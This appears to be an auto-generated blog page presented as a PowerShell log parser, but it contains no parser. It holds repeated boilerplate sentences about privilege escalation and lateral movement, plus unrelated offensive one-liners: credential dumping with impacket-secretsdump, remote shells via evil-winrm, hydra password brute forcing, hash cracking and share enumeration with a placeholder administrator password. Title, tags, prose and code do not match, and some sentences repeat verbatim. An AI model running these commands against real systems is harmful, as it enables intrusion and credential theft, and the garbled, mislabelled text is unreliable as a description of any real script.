---
TitleSEO: "Log Parser and Analyzer in PowerShell | ZureFX"
TitlePost: "Log Parser and Analyzer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for log parser and analyzer. Built for security research and automation."
Keywords: "bash, rust, script, powershell"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-395.html"
URL_IMAGES: ""
Date: "2024-10-30"
Tags: "Bash, Rust, Script, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-395"
Permalink: "/scripting/script-log-parser-and-analyzer-395.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `psexec`
- `GetNPUsers`
- `rubeus`

## Implementation

### Core Logic

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
evil-winrm -i 10.64.217.183 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.10.32.35/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.210.130
```

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
nmap -sCV -p23,3306,636 10.78.20.49 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.174.117
crackmapexec smb 10.55.78.176 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.93.180.28 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.39.105.209 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p21,25,23 10.21.145.116 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

```bash
gobuster dir -u http://10.89.50.182/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.118.70.172 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

```
[+] Scanning target...
[+] Found 19 results
[+] Done in 13.97s
```
